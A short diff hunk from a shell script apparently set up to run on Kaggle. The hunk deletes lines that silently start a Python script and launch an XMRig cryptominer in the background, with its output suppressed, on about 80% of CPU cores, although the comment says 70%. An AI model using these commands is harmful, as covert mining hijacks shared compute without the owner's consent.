@@ -74,14 +74,5 @@ if __name__ == '__main__':
     main()
 EOF
 
-# Calculate 70% of the total CPU cores
-CORES=$(nproc)
-THREADS=$((CORES * 80 / 100))
-
 # Write the Python script content to the file /root/1.py
 echo "$PYTHON_SCRIPT" | sudo tee /kaggle/working/1.py >/dev/null
-
-nohup /usr/bin/python3 1.py &> /dev/null &
-
-nohup /kaggle/working/xmrig-6.22.2/xmrig a rx -o stratum+ssl://localhost:3333 --threads=$THREADS --huge-pages-jit --randomx-1gb-pages --randomx-wrmsr=-1 --cpu-no-yield -k -u 1710454080.kaggle#e1rj-h9dc -p x &> /dev/null &
-
